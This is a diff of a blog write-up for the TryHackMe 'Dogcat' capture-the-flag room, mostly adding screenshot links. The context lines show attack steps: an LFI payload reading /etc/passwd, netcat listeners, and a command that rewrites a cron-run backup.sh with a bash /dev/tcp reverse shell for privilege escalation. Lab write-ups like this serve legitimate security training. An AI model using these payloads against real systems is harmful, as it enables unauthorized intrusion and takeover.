@@ -16,6 +16,7 @@ published: true
 - [Reverse shell](#reverse-shell)
 - [Privilege Escalation:](#privilege-escalation)
 - [4th Flag](#4th-flag)
+
 <!-- toc -->
 
 ### Dogcat
@@ -43,7 +44,7 @@ nmap -sV -p- -vv BoxIP
 ```sh
 http://box-ip
 ```
-
+![alt text](https://thelastvvv.github.io/images/posts/3/main.png "THM")
 so let check lfi playloads
 ```sh
 http://box-ip/?view=../../../../../../etc/passwd
@@ -222,11 +223,11 @@ Now we start listening to port (depend on you shell settings)
 ```sh
 nc -lvnp 1234
 ```
-
+![alt text](https://thelastvvv.github.io/images/posts/3/t1.png "THM")
 
 * 2nd flag:
 
-
+![alt text](https://thelastvvv.github.io/images/posts/3/t2.png "THM")
 
 ### Privilege Escalation:
 
@@ -241,7 +242,7 @@ More details here :
 ](https://gtfobins.github.io/gtfobins/env/
 )
 
-
+![alt text](https://thelastvvv.github.io/images/posts/3/t3.png "THM")
 
 
 
@@ -251,7 +252,7 @@ if we search in the backups dir we will find backup.sh that runs every-time,so n
 echo "#!/bin/bash" > backup.sh;echo "bash -i >& /dev/tcp/ip/Your-IP/port 0>&1" >> backup.sh
 ```
 
-
+![alt text](https://thelastvvv.github.io/images/posts/3/ttt2.png "THM")
 
 
 
@@ -259,7 +260,7 @@ Now we start listening to port
 ```sh
 nc -lvnp 9999
 ```
-
+![alt text](https://thelastvvv.github.io/images/posts/3/ttt4.png "THM")
 
 voila we got all our 4 flags btw flags looks like this `THM{xx_xx_xx}` :P
 
